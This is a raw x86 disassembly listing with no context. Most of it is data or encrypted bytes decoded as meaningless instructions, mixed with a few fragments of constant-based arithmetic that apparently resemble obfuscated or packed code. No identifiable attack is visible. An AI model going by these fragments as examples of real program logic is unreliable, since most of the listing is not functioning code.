  40e9b8:	cmp    ebx,DWORD PTR [ebp-0x35]
  40e9bb:	push   cs
  40e9bc:	js     0x40ea1e
  40e9be:	sub    esi,DWORD PTR [esi+0x19]
  40e9c1:	enter  0x582b,0x73
  40e9c5:	frstor [eax]
  40e9c7:	(bad)  
  40e9c9:	push   esi
  40e9ca:	not    ebx
  40e9cc:	inc    edx
  40e9cd:	gs arpl cx,bp
  40e9d0:	ins    DWORD PTR es:[edi],dx
  40e9d1:	mov    ah,0x11
  40e9d3:	mov    edi,0x95a77580
  40e9d8:	xchg   ebx,eax
  40e9d9:	pop    esp
  40e9da:	inc    edx
  40e9db:	sub    ebp,DWORD PTR [ebx+0x10d9089f]
  40e9e1:	jo     0x40ea36
  40e9e3:	push   cs
  40e9e4:	dec    ecx
  40e9e5:	out    0xac,eax
  40e9e7:	push   es
  40e9e8:	mov    esi,0x83498b6f
  40e9ed:	mov    eax,0x6e066795
  40e9f2:	push   ebx
  40e9f3:	push   ebx
  40e9f4:	jmp    0x9e93dd22
  40e9f9:	lahf   
  40e9fa:	inc    edx
  40e9fb:	mov    al,0x3e
  40e9fd:	repz add edx,edi
  40ea00:	push   edx
  40ea01:	jl     0x40e9df
  40ea03:	rcl    DWORD PTR [edx+0x5ac99738],1
  40ea09:	sub    edx,DWORD PTR [ebx]
  40ea0b:	stos   DWORD PTR es:[edi],eax
  40ea0c:	and    al,0x5c
  40ea0e:	aam    0xdf
  40ea10:	and    ah,BYTE PTR [ebp+0x1e]
  40ea13:	je     0x40ea03
  40ea15:	mov    ah,0xdb
  40ea17:	pop    esp
  40ea18:	ds dec edi
  40ea1a:	jge    0x40e9d4
  40ea1c:	xchg   esp,eax
  40ea1d:	into   
  40ea1e:	or     al,0x37
  40ea20:	icebp  
  40ea21:	arpl   WORD PTR ds:0x93e231af,bp
  40ea27:	neg    BYTE PTR [edi+0x3c]
  40ea2a:	dec    ebx
  40ea2b:	and    BYTE PTR [ebp+0x47],dl
  40ea2e:	lea    edx,gs:[esi-0x66]
  40ea32:	jle    0x40e9cc
  40ea34:	jbe    0x40e9cd
  40ea36:	daa    
  40ea37:	push   0xd8e88e0f
  40ea3c:	jnp    0x40e9e5
  40ea3e:	jmp    0x9f03edfd
  40ea43:	sbb    BYTE PTR [ebx-0x26],0x68
  40ea47:	out    dx,eax
  40ea48:	mov    cl,0x4b
  40ea4a:	sahf   
  40ea4b:	loop   0x40ea59
  40ea4d:	mov    BYTE PTR [ebp-0x218a69ff],ch
  40ea53:	jmp    0x7ca2226a
  40ea58:	and    al,al
  40ea5a:	stos   DWORD PTR es:[edi],eax
  40ea5b:	int    0x2e
  40ea5d:	adc    BYTE PTR [ecx+0x76e81453],ch
  40ea63:	mov    ch,0x45
  40ea65:	std    
  40ea66:	or     dl,dh
  40ea68:	les    ebp,FWORD PTR [ebx+0x2003f4f7]
  40ea6e:	mov    ch,0xb7
  40ea70:	mov    dl,0x2
  40ea72:	jo     0x40ea37
  40ea74:	icebp  
  40ea75:	aad    0xc7
  40ea77:	lahf   
  40ea78:	xor    dh,BYTE PTR [edi-0x763a22c]
  40ea7e:	mov    edx,ebx
  40ea80:	jb     0x40eaa1
  40ea82:	sub    bl,BYTE PTR [esp+ebx*4+0x3e2ab807]
  40ea89:	xor    BYTE PTR [eiz*2+0x3e724578],bl
  40ea90:	cmp    ecx,esi
  40ea92:	cld    
  40ea93:	(bad)  [ebx+0x611e67fa]
  40ea99:	not    BYTE PTR es:[ebp+0x16]
  40ea9d:	jmp    0xc8418437
  40eaa2:	xor    edx,edx
  40eaa4:	div    edi
  40eaa6:	mov    edx,DWORD PTR ds:0x422548
  40eaac:	mov    edx,DWORD PTR [edx+0x1d4]
  40eab2:	sub    edx,eax
  40eab4:	mov    eax,DWORD PTR [ebp+0x10]
  40eab7:	mov    al,BYTE PTR [esi+eax*1]
  40eaba:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40eac1:	mov    eax,DWORD PTR [ebp-0x1c]
  40eac4:	mov    edx,DWORD PTR [ebp-0x18]
  40eac7:	imul   eax,edx
  40eaca:	mov    edx,DWORD PTR [ebp-0x14]
  40eacd:	imul   eax,eax,0x262b
  40ead3:	or     eax,edx
  40ead5:	mov    edx,DWORD PTR [ebp-0x10]
  40ead8:	or     eax,edx
  40eada:	xor    eax,0x59f6
  40eadf:	jmp    0x40eda3
  40eae4:	sub    BYTE PTR [edi-0x3c],0x71
  40eae8:	pushf  
  40eae9:	sbb    bl,BYTE PTR [edx]
  40eaeb:	pop    edx
  40eaec:	mov    ebp,0x25aa14b9
  40eaf1:	rol    DWORD PTR [ecx+0x18b8fdb0],0x18
  40eaf8:	rcl    BYTE PTR [eax+ebx*1],cl
  40eafb:	sbb    BYTE PTR [ecx+0x2c2fadbb],dl
  40eb01:	mov    esp,0x8a2570f0
  40eb06:	sbb    al,0xbc
  40eb08:	mov    eax,ds:0x6914f01
  40eb0d:	mov    esi,0xd0764dd8
  40eb12:	dec    esi
  40eb13:	aad    0xbb
  40eb15:	shr    DWORD PTR [ebx+0x4f2942b9],0xc9
  40eb1c:	mov    cs,WORD PTR [ecx-0x68]
  40eb1f:	sbb    eax,DWORD PTR [esi]
  40eb21:	test   dl,dh
  40eb23:	add    al,BYTE PTR [eax]
  40eb25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb26:	jns    0x40eb6c
  40eb28:	jbe    0x40eace
  40eb2a:	(bad)  
  40eb2b:	pop    ss
  40eb2c:	mov    ebx,esi
  40eb2e:	or     DWORD PTR [eax],esp
  40eb30:	(bad)  
  40eb31:	cmp    ebx,DWORD PTR [ebx+ecx*1-0x29d926ec]
  40eb38:	out    0x49,al
  40eb3a:	inc    ebp
  40eb3b:	inc    edx
  40eb3c:	fs sbb al,0x20
  40eb3f:	xchg   esp,eax
  40eb40:	js     0x40eb01
  40eb42:	hlt    
  40eb43:	xor    ecx,DWORD PTR [edx]
  40eb45:	test   DWORD PTR [ecx+eiz*1-0x39],edx
  40eb49:	jb     0x40eb5b
  40eb4b:	pushf  
  40eb4c:	data16 rol BYTE PTR fs:[eax],1
  40eb50:	in     al,dx
  40eb51:	cmp    eax,0x954979ba
  40eb56:	add    ebx,DWORD PTR [esi]
  40eb58:	pop    ecx
  40eb59:	push   ecx
  40eb5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb5b:	stos   DWORD PTR es:[edi],eax
  40eb5c:	mov    ebp,0x2be15abf
  40eb61:	sbb    ecx,ecx
  40eb63:	mov    edi,0x87ffc73f
  40eb68:	push   ebx
  40eb69:	jmp    0x40ebcc
  40eb6b:	mov    esp,0x115c3bfe
  40eb70:	ja     0x40eb78
  40eb72:	sub    DWORD PTR [eax+0x7b2bf233],0xffffff9c
  40eb79:	mov    al,ds:0x2323eb63
  40eb7e:	xchg   ebp,eax
  40eb7f:	cmp    ah,BYTE PTR [ecx-0x9c56544]
  40eb85:	mov    al,0x33
  40eb87:	(bad)  
  40eb88:	mov    edi,0x64d3d444
  40eb8d:	addr16 es in al,dx
  40eb90:	jno    0x40eb5f
  40eb92:	mov    ch,BYTE PTR [ebp-0x59849c24]
  40eb98:	inc    esp
  40eb99:	inc    edx
  40eb9a:	dec    ebx
  40eb9b:	and    BYTE PTR [esp+ecx*1],bh
  40eb9e:	int3   
  40eb9f:	out    dx,al
  40eba0:	psubd  mm6,QWORD PTR [edi]
  40eba3:	daa    
  40eba4:	bound  ecx,QWORD PTR [ebp+eiz*2-0x15cdfbe1]
  40ebab:	mov    al,ds:0xbeb439c7
  40ebb0:	pop    ss
  40ebb1:	std    
  40ebb2:	dec    ecx
  40ebb3:	mov    dh,0x78
  40ebb5:	call   0x37b285a0
  40ebba:	repz pop edx
  40ebbc:	fcmovnu st,st(5)
  40ebbe:	sub    al,0x4
  40ebc0:	retf   0x3d23
  40ebc3:	sti    
  40ebc4:	pop    ss
  40ebc5:	ja     0x40eb78
  40ebc7:	xlat   BYTE PTR ds:[ebx]
  40ebc8:	add    al,0xca
  40ebca:	rol    BYTE PTR [ebp+ebx*1+0x133190a5],1
  40ebd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebd2:	enter  0x8f73,0xec
  40ebd6:	mov    edx,0xacb5e3ce
  40ebdb:	dec    edx
  40ebdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebdd:	push   esi
  40ebde:	sbb    al,0xa0
  40ebe0:	cs xchg ebx,eax
  40ebe2:	sub    bh,BYTE PTR [eax]
  40ebe4:	aaa    
  40ebe5:	daa    
  40ebe6:	stos   DWORD PTR es:[edi],eax
  40ebe7:	mov    ds:0xf161d32d,al
  40ebec:	push   ebx
  40ebed:	and    al,0x8c
  40ebef:	bnd jne 0x40ec44
  40ebf2:	jbe    0x40eba2
  40ebf4:	and    DWORD PTR [esi+0x66267cbe],edi
  40ebfa:	ja     0x40ec6f
  40ebfc:	mov    ebx,0xb90d1738
  40ec01:	inc    eax
  40ec02:	int3   
  40ec03:	out    0xbb,al
  40ec05:	xchg   ebx,eax
  40ec06:	inc    ecx
  40ec07:	dec    esp
  40ec08:	inc    ebx
  40ec09:	push   0x60
  40ec0b:	in     al,dx
  40ec0c:	in     al,0x5d
  40ec0e:	jmp    0x1cfca6d8
  40ec13:	in     eax,dx
  40ec14:	inc    eax
  40ec15:	imul   esi,DWORD PTR [edx-0x7c6f30a9],0x35
  40ec1c:	dec    esp
  40ec1d:	xchg   ebx,eax
  40ec1e:	sub    al,0xe1
  40ec20:	adc    DWORD PTR [ebx+0x661dcd05],0x51
  40ec27:	sbb    BYTE PTR [ebx],al
  40ec29:	dec    ecx
  40ec2a:	sbb    eax,0x2f39da17
  40ec2f:	js     0x40ec77
  40ec31:	imul   esi,DWORD PTR [ecx],0xffffffb3
  40ec34:	xor    ah,dh
  40ec36:	cli    
  40ec37:	es add al,0x4e
  40ec3a:	call   FWORD PTR [eax-0x3c9d360b]
  40ec40:	jp     0x40ec2b
  40ec42:	cdq    
  40ec43:	jg     0x40ec9b
  40ec45:	jp     0x40ebc7
  40ec47:	mov    cl,0xc0
  40ec49:	mov    al,0xbb
  40ec4b:	pop    edx
  40ec4c:	ret    
  40ec4d:	mov    WORD PTR [esi],ds
  40ec4f:	mov    DWORD PTR [edi+0x36996cc7],edx
  40ec55:	mov    esp,0x9ee8c9b6
  40ec5a:	push   ebp
  40ec5b:	dec    esi
  40ec5c:	popf   
  40ec5d:	popa   
  40ec5e:	clc    
  40ec5f:	ss scas eax,DWORD PTR es:[edi]
  40ec61:	cld    
  40ec62:	(bad)  
  40ec63:	cld    
  40ec64:	nop
  40ec65:	(bad)  
  40ec66:	call   0x14:0x260af284
  40ec6d:	aaa    
  40ec6e:	xor    DWORD PTR [edi],eax
  40ec70:	and    dh,BYTE PTR [eax]
  40ec72:	mov    dl,0xa8
  40ec74:	fwait
  40ec75:	mul    BYTE PTR [ecx+ecx*2]
  40ec78:	in     al,0x87
  40ec7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec7b:	call   0x44bd5f96
  40ec80:	jge    0x40ec14
  40ec82:	push   ebp
  40ec83:	scas   eax,DWORD PTR es:[edi]
  40ec84:	mov    ds:0xc1137db1,eax
  40ec89:	push   ebx
  40ec8a:	int    0x15
  40ec8c:	ret    
  40ec8d:	aas    
  40ec8e:	adc    eax,0xa1716fc4
  40ec93:	jns    0x40ece4
  40ec95:	arpl   si,bx
  40ec97:	and    BYTE PTR [eax+edi*8],al
  40ec9a:	sub    BYTE PTR [ebx+0x6920aa79],dh
  40eca0:	aad    0xc2
  40eca2:	(bad)  
  40eca3:	or     al,0xb
  40eca5:	mov    esi,0xcc7cc134
  40ecaa:	xchg   ecx,eax
  40ecab:	loop   0x40eca0
  40ecad:	aas    
  40ecae:	jecxz  0x40ece0
  40ecb0:	jp     0x40ecc8
  40ecb2:	je     0x40ed14
  40ecb4:	jne    0x40ed2b
  40ecb6:	rol    BYTE PTR [edi+0x77449861],0x4a
  40ecbd:	mov    bp,0x8758
  40ecc1:	pop    es
  40ecc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecc3:	loopne 0x40ec6d
  40ecc5:	mov    ebp,0x64b7b696
  40ecca:	jp     0x40ec61
  40eccc:	(bad)  [esi]
  40ecce:	sub    cl,BYTE PTR [ebx*1+0x6f6fd3ea]
  40ecd5:	cli    
  40ecd6:	xchg   edx,eax
  40ecd7:	test   bl,bl
  40ecd9:	push   cs
  40ecda:	out    dx,al
  40ecdb:	sub    eax,0x1d809e4e
  40ece0:	loop   0x40ed0b
  40ece2:	xchg   esp,eax
  40ece3:	jmp    0xbf61:0x9073a4a4
  40ecea:	mov    al,ds:0x1d9da3d5
  40ecef:	mov    eax,ds:0xe78bc9d
  40ecf4:	cs mov gs:0x498e8cb9,al
  40ecfb:	cmp    DWORD PTR [edi+0x6c766920],ecx
  40ed01:	iret   
  40ed02:	cmp    eax,0x12ba0a53
  40ed07:	jb     0x40ec9c
  40ed09:	fucomp st(0)
  40ed0b:	nop
  40ed0c:	shl    DWORD PTR [esi+0x79ec2a78],0xbf
  40ed13:	inc    edx
  40ed14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed15:	neg    BYTE PTR [edx-0x73]
  40ed18:	mov    eax,ds:0x76775de7
  40ed1d:	and    al,0xf0
  40ed1f:	ja     0x40ed98
  40ed21:	addr16 cmc 
  40ed23:	fdivr  QWORD PTR [ebp+0x2]
  40ed26:	dec    esp
  40ed27:	jl     0x40ed58
  40ed29:	ret    0x79bb
  40ed2c:	push   ebp
  40ed2d:	popa   
  40ed2e:	push   edi
  40ed2f:	pop    esi
  40ed30:	outs   dx,BYTE PTR ds:[esi]
  40ed31:	ins    BYTE PTR es:[edi],dx
  40ed32:	xor    eax,0x282eb384
  40ed37:	(bad)  
  40ed38:	daa    
  40ed39:	push   es
  40ed3a:	lds    esi,FWORD PTR [edx+0x6e]
  40ed3d:	scas   al,BYTE PTR es:[edi]
  40ed3e:	pop    esi
  40ed3f:	xor    DWORD PTR [ecx-0x36],0x52edc173
  40ed46:	dec    edx
  40ed47:	dec    edi
  40ed48:	dec    ebp
  40ed49:	dec    ecx
  40ed4a:	in     al,dx
  40ed4b:	inc    ecx
  40ed4c:	mov    bh,0x42
  40ed4e:	mov    dh,0x4f
  40ed50:	loope  0x40edb5
  40ed52:	add    DWORD PTR [edx-0x3d],ecx
  40ed55:	mov    bl,cl
  40ed57:	sbb    DWORD PTR [edx],esp
  40ed59:	jbe    0x40ed5a
  40ed5b:	rol    BYTE PTR [edi-0x4c6b69b3],cl
  40ed61:	(bad)  
  40ed62:	sar    DWORD PTR [ebx-0x616b4e1d],1
  40ed68:	and    ecx,ecx
  40ed6a:	pop    edi
  40ed6b:	loopne 0x40ed6f
  40ed6d:	loop   0x40ed23
  40ed6f:	mov    DWORD PTR [ecx],edi
  40ed71:	inc    ebx
  40ed72:	or     BYTE PTR [eax],bl
  40ed74:	push   edx
  40ed75:	int    0xb9
  40ed77:	sbb    ecx,DWORD PTR [eax]
  40ed79:	(bad)  
  40ed7a:	int    0x5a
  40ed7c:	int3   
  40ed7d:	arpl   WORD PTR [esp+edi*1+0x58],di
  40ed81:	(bad)  
  40ed82:	pop    ecx
  40ed83:	cs enter 0x52b,0x86
  40ed88:	and    edx,eax
  40ed8a:	or     ecx,esp
  40ed8c:	pushf  
  40ed8d:	(bad)  
  40ed8e:	mov    cs,WORD PTR [esi+edi*8]
  40ed91:	gs (bad) 
  40ed93:	int3   
  40ed94:	test   BYTE PTR [edx+esi*1-0x4cfc7f9f],cl
  40ed9b:	scas   al,BYTE PTR es:[edi]
  40ed9c:	(bad)  
  40ed9e:	inc    ebp
  40ed9f:	jae    0x40ed8d
  40eda1:	in     al,0xe
  40eda3:	lea    ecx,[ecx+eax*1+0x350559e6]
  40edaa:	mov    eax,DWORD PTR [ebp-0xc]
  40edad:	and    eax,0xddc
  40edb2:	add    eax,DWORD PTR [ebp-0x8]
  40edb5:	xor    eax,0x46e3
  40edba:	add    eax,0x50eb
  40edbf:	cmp    ecx,eax
  40edc1:	jmp    0x40f085
  40edc6:	cmp    DWORD PTR [edx-0x25e5f4a4],ecx
  40edcc:	daa    
  40edcd:	sub    ch,BYTE PTR [edx-0x2555ed90]
  40edd3:	mov    al,0x51
  40edd5:	jle    0x40ed8e
  40edd7:	mov    dl,0x18
  40edd9:	sbb    dl,dl
  40eddb:	adc    al,0x18
  40eddd:	sbb    BYTE PTR [esi-0x7f],dh
  40ede0:	icebp  
  40ede1:	test   DWORD PTR [edx-0x672ddd41],0x8f034703
  40edeb:	in     al,dx
  40edec:	adc    al,0x98
  40edee:	jl     0x40ee5a
  40edf0:	or     al,0x33
  40edf2:	das    
  40edf3:	xor    ecx,DWORD PTR [eax]
  40edf5:	sbb    BYTE PTR [edx+0x72],0x5
  40edf9:	(bad)  
  40edfa:	xlat   BYTE PTR ds:[ebx]
  40edfb:	cli    
  40edfc:	jne    0x40ee3f
  40edfe:	stos   DWORD PTR es:[edi],eax
  40edff:	cmp    DWORD PTR [ecx+0x2bd01ea6],ebx
  40ee05:	loop   0x40edc1
  40ee07:	and    DWORD PTR ds:0x8117b89,esp
  40ee0d:	dec    esp
  40ee0e:	dec    esp
  40ee0f:	enter  0x34ed,0xe6
  40ee13:	enter  0xffdb,0x54
  40ee17:	adc    ebp,esp
  40ee19:	test   eax,0xf50b1081
  40ee1e:	loop   0x40ee73
  40ee20:	ss loope 0x40edd2
  40ee23:	jle    0x40ee64
  40ee25:	mov    ebx,0x60c5a431
  40ee2a:	push   ebx
  40ee2b:	mov    eax,ds:0x3647c8a4
  40ee30:	jmp    0x40ee60
  40ee32:	xchg   ebx,eax
  40ee33:	test   BYTE PTR [bx+di],al
  40ee36:	lods   eax,DWORD PTR ds:[esi]
  40ee37:	inc    eax
  40ee38:	ja     0x40eea7
  40ee3a:	std    
  40ee3b:	lods   eax,DWORD PTR ds:[esi]
  40ee3c:	pop    ss
  40ee3d:	test   BYTE PTR [esi+0x417b0966],0x59
  40ee44:	lea    ebp,[eax]
  40ee46:	jle    0x40eebe
  40ee48:	jae    0x40eeab
  40ee4a:	into   
  40ee4b:	in     eax,0x1c
  40ee4d:	das    
  40ee4e:	or     eax,0x3f461202
  40ee53:	sbb    dh,BYTE PTR [edi+0x49f19fc4]
  40ee59:	push   edx
  40ee5a:	sbb    DWORD PTR [edx+0x4],ecx
  40ee5d:	lods   eax,DWORD PTR ds:[esi]
  40ee5e:	dec    esp
  40ee5f:	cmp    al,0x6
  40ee61:	cmp    eax,ebx
  40ee63:	dec    ebx
  40ee64:	pop    esp
  40ee65:	into   
  40ee66:	sbb    DWORD PTR [ebp-0x63e01904],ebp
  40ee6c:	pop    edx
  40ee6d:	mov    ?,WORD PTR [eax+esi*1-0x56dd1c29]
  40ee74:	add    DWORD PTR [ecx-0x65fc85d0],eax
  40ee7a:	pop    edx
  40ee7b:	pop    esi
  40ee7c:	(bad)
  40ee7f:	push   ebp
  40ee80:	imul   ebp,DWORD PTR [eax+0x1e],0x657cd082
  40ee87:	ds test bh,0xc4
  40ee8b:	icebp  
  40ee8c:	inc    esi
  40ee8d:	fidiv  WORD PTR [esi+ecx*1+0x24]
  40ee91:	mov    ds:0xdc94142e,al
  40ee96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee97:	imul   eax,DWORD PTR [ecx-0x44],0xfc6367e9
  40ee9e:	scas   al,BYTE PTR es:[edi]
  40ee9f:	sbb    DWORD PTR [eax-0x2a193d82],esp
  40eea5:	mov    ds,ebx
  40eea7:	(bad)  
  40eea8:	or     eax,0xe2674f32
  40eead:	fimul  DWORD PTR [ebx-0x2e02d55a]
  40eeb3:	xor    esp,DWORD PTR [ebx]
  40eeb5:	jmp    0x1feb6783
  40eeba:	mov    ecx,DWORD PTR [ecx]
  40eebc:	mov    edi,eax
  40eebe:	mov    ds:0x3879553c,eax
  40eec3:	test   al,0x6b
  40eec5:	call   0xa7a5:0xed1a7a7d
  40eecc:	add    al,0x3b
  40eece:	mov    ecx,0xd5d3feb7
  40eed3:	js     0x40eec0
  40eed5:	pop    ds
  40eed6:	mov    bh,0x5b
  40eed8:	rcl    edx,1
  40eeda:	jo     0x40ee8a
  40eedc:	clc    
  40eedd:	js     0x40eef2
  40eedf:	(bad)  [ecx-0x30]
  40eee2:	in     eax,dx
  40eee3:	(bad)  
  40eee4:	shl    BYTE PTR [esi+0x3b],cl
  40eee7:	sahf   
  40eee8:	test   DWORD PTR ds:0x809361eb,0x78a179ab
  40eef2:	adc    ecx,eax
  40eef4:	out    0x2e,eax
  40eef6:	sub    al,BYTE PTR ds:0xeefcda0a
  40eefc:	test   ebx,esi
  40eefe:	xchg   ebx,edx
  40ef00:	mov    esi,DWORD PTR [edx+0x23]
  40ef03:	pop    ecx
  40ef04:	into   
  40ef05:	xchg   esi,eax
  40ef06:	in     eax,0xbe
  40ef08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef09:	jo     0x40ef06
  40ef0b:	mov    ah,0x4f
  40ef0d:	xor    BYTE PTR [esi],al
  40ef0f:	jl     0x40eefa
  40ef11:	(bad)  
  40ef12:	pusha  
  40ef13:	add    eax,0x1571559e
  40ef18:	imul   esi,DWORD PTR [ecx-0x3da71777],0x4137588
  40ef22:	icebp  
  40ef23:	outs   dx,DWORD PTR ds:[esi]
  40ef24:	inc    ebx
  40ef25:	jmp    FWORD PTR [ecx]
  40ef27:	fisttp QWORD PTR ds:0xe23bb554
  40ef2d:	sub    BYTE PTR [eax],ah
  40ef2f:	and    bl,0xf5
  40ef32:	mov    ebx,0xddd27754
  40ef37:	in     al,dx
  40ef38:	push   0x5e
  40ef3a:	pop    edx
  40ef3b:	(bad)  
  40ef3c:	push   esp
  40ef3d:	and    esp,edx
  40ef3f:	xchg   ecx,eax
  40ef40:	push   edx
  40ef41:	inc    ebp
  40ef42:	icebp  
  40ef43:	xor    ah,al
  40ef45:	mov    eax,ds:0xdf3ac00e
  40ef4a:	int3   
  40ef4b:	adc    BYTE PTR [ebx+0x28],al
  40ef4e:	dec    dh
  40ef50:	les    ecx,FWORD PTR ds:0x662a0c16
  40ef56:	or     eax,0x38b6389c
  40ef5b:	dec    esp
  40ef5c:	ss mov ebp,0x8a2d0301
  40ef62:	cmp    eax,0xc4a74553
  40ef67:	cmp    al,0x7d
  40ef69:	lock xor eax,0xd56733dd
  40ef6f:	adc    eax,0x820da96a
  40ef74:	call   0x22f8:0x1a1764cc
  40ef7b:	lds    esp,FWORD PTR [ebx-0x4b]
  40ef7e:	lea    ebx,[edx]
  40ef80:	jmp    0x40efba
  40ef82:	enter  0xfbf1,0x34
  40ef86:	mov    edi,0xc639f1bf
  40ef8b:	neg    BYTE PTR [eax-0x38]
  40ef8e:	scas   eax,DWORD PTR es:[edi]
  40ef8f:	outs   dx,BYTE PTR ds:[esi]
  40ef90:	mov    cs,esp
  40ef92:	sub    ch,BYTE PTR [eax]
  40ef94:	fcmovu st,st(6)
  40ef96:	mov    al,0xd7
  40ef98:	sar    ebx,cl
  40ef9a:	mov    ds:0x4a727d6e,eax
  40ef9f:	jg     0x40ef95
  40efa1:	ret    
  40efa2:	pushf  
  40efa3:	jge    0x40f023
  40efa5:	sbb    al,0x13
  40efa7:	inc    ebp
  40efa8:	adc    eax,0x83825e4e
  40efad:	shr    DWORD PTR [edx],cl
  40efaf:	cmp    ah,BYTE PTR [edx]
  40efb1:	not    eax
  40efb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efb4:	test   eax,0xfe9d3c51
  40efb9:	pop    esi
  40efba:	out    0xe5,eax
  40efbc:	push   ebp
  40efbd:	pop    ebx
  40efbe:	daa    
  40efbf:	jmp    0x40efe0
  40efc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efc2:	pop    esi
  40efc3:	sbb    eax,0xecc7c3cf
  40efc8:	call   0x81fed0ac
  40efcd:	out    dx,eax
  40efce:	shr    DWORD PTR [ebx+0x10],cl
  40efd1:	in     al,dx
  40efd2:	out    dx,al
  40efd3:	stos   DWORD PTR es:[edi],eax
  40efd4:	mov    eax,0x9710972f
  40efd9:	dec    ecx
  40efda:	neg    BYTE PTR [edi]
  40efdc:	aaa    
  40efdd:	sbb    bh,BYTE PTR [eax-0x75]
  40efe0:	xor    DWORD PTR [esi],ebp
  40efe2:	sbb    al,0x8c
  40efe4:	mov    ch,0xa3
  40efe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efe7:	jb     0x40efe7
  40efe9:	cdq    
  40efea:	inc    ebp
  40efeb:	jl     0x40f00b
  40efed:	push   0xb7008325
  40eff2:	pusha  
  40eff3:	int    0xe9
  40eff5:	pop    es
  40eff6:	mov    al,cl
  40eff8:	adc    eax,0x8b9a3f97
  40effd:	push   ecx
  40effe:	dec    esi
  40efff:	xchg   esp,eax
  40f000:	push   cs
  40f001:	ds mov dh,0xdd
  40f004:	cmc    
  40f005:	adc    ecx,DWORD PTR [esi-0x5e]
  40f008:	add    DWORD PTR [edi],esi
  40f00a:	push   ecx
  40f00b:	mov    al,ds:0x9ec14d26
  40f010:	std    
  40f011:	fwait
  40f012:	aas    
  40f013:	scas   eax,DWORD PTR es:[edi]
  40f014:	popa   
  40f015:	mov    bl,0x3e
  40f017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f018:	test   BYTE PTR [ebx-0x60],dl
  40f01b:	mov    al,0x30
  40f01d:	sahf   
  40f01e:	int3   
  40f01f:	push   cs
  40f020:	lahf   
  40f021:	and    eax,0x205e9629
  40f026:	sbb    ah,BYTE PTR [ecx]
  40f028:	inc    eax
  40f029:	xchg   ecx,eax
  40f02a:	adc    eax,0xe9a3fbd8
  40f02f:	xor    BYTE PTR [esi],ch
  40f031:	cwde   
  40f032:	fnstenv [edx+0x3e]
  40f035:	cli    
  40f036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f037:	pushf  
  40f038:	add    BYTE PTR [esi-0x30],cl
  40f03b:	in     al,dx
  40f03c:	out    0xc4,al
  40f03e:	popf   
  40f03f:	popf   
  40f040:	rcr    BYTE PTR [esi-0x36],0x44
  40f044:	mov    dl,0x43
  40f046:	adc    esp,DWORD PTR [edi+ebp*1-0x19]
  40f04a:	out    dx,al
  40f04b:	push   eax
  40f04c:	mov    edx,0x9377fcc1
  40f051:	pop    eax
  40f052:	sbb    BYTE PTR [ecx+0x54],0xfc
  40f056:	(bad)  
  40f057:	mov    bl,0xc0
  40f059:	cdq    
  40f05a:	js     0x40efde
  40f05c:	and    ah,cl
  40f05e:	bound  esp,QWORD PTR [esi+eax*4-0x7102647d]
  40f065:	enter  0x2f38,0xde
  40f069:	mov    ah,0xa7
  40f06b:	jo     0x40f0a6
  40f06d:	xor    cl,BYTE PTR [edx]
  40f06f:	popf   
  40f070:	inc    ebp
  40f071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f072:	pusha  
  40f073:	imul   eax,DWORD PTR [esi+0x2bf0e7a4],0xfffffffb
  40f07a:	popa   
  40f07b:	into   
  40f07c:	add    dl,BYTE PTR [edx+0x7ba0e26d]
  40f082:	retf   
  40f083:	push   edi
  40f084:	inc    edi
  40f085:	jne    0x40e793
  40f08b:	pop    edi
  40f08c:	jmp    0x40f350
  40f091:	inc    edi
  40f092:	mov    ds:0x305a70db,al
  40f097:	inc    edx
  40f098:	call   0x9da0:0xaa146552
  40f09f:	pop    ebp
  40f0a0:	jo     0x40f112
  40f0a2:	scas   al,BYTE PTR es:[edi]
  40f0a3:	sbb    BYTE PTR [eax],bl
  40f0a5:	rcl    BYTE PTR [eax+ebx*1],cl
  40f0a8:	sbb    BYTE PTR [edi+0x51],bl
  40f0ab:	sbb    eax,0xe211832e
  40f0b0:	mov    edi,0x717db038
  40f0b5:	int    0xf6
  40f0b7:	ret    
  40f0b8:	stc    
  40f0b9:	ins    DWORD PTR es:[edi],dx
  40f0ba:	rcr    DWORD PTR [edi+0x36],0x5d
  40f0be:	jae    0x40f11c
  40f0c0:	mov    esi,0xdcaa5505
  40f0c5:	scas   al,BYTE PTR es:[edi]
  40f0c6:	sar    eax,0xe1
  40f0c9:	nop
  40f0ca:	ret    0xb700
  40f0cd:	xlat   BYTE PTR ds:[ebx]
  40f0ce:	mov    BYTE PTR [esi],ah
  40f0d0:	and    DWORD PTR [edi-0x72],0xffffffcd
  40f0d4:	dec    ecx
  40f0d5:	nop
  40f0d6:	int3   
  40f0d7:	mov    bh,al
  40f0d9:	xchg   esp,eax
  40f0da:	fistp  QWORD PTR [edi+0x27]
  40f0dd:	fild   WORD PTR [ebx+0x47251a2f]
  40f0e3:	call   0x6d8cacd0
  40f0e8:	mov    eax,ds:0xd0bfb88
  40f0ed:	jmp    0x40f0dd
  40f0ef:	call   0xb7ca57f9
  40f0f4:	stc    
  40f0f5:	jl     0x40f130
  40f0f7:	cmp    BYTE PTR ds:0x474c39eb,bh
  40f0fd:	pop    ebx
  40f0fe:	test   DWORD PTR [esi-0x13],ebx
  40f101:	xor    ebx,DWORD PTR [ebp+ebx*1+0x7ad6a672]
  40f108:	dec    edi
  40f109:	sti    
  40f10a:	xchg   esp,eax
  40f10b:	mov    dl,BYTE PTR ds:0x737fec22
  40f111:	stos   DWORD PTR es:[edi],eax
  40f112:	sbb    edx,edx
  40f114:	xor    al,0x7c
  40f116:	fisttp QWORD PTR [esi+edi*1-0x187e3918]
  40f11d:	add    al,0xfb
  40f11f:	cwde   
  40f120:	fwait
  40f121:	test   BYTE PTR [esi],bh
  40f123:	sbb    edi,DWORD PTR [ecx+0x428f1043]
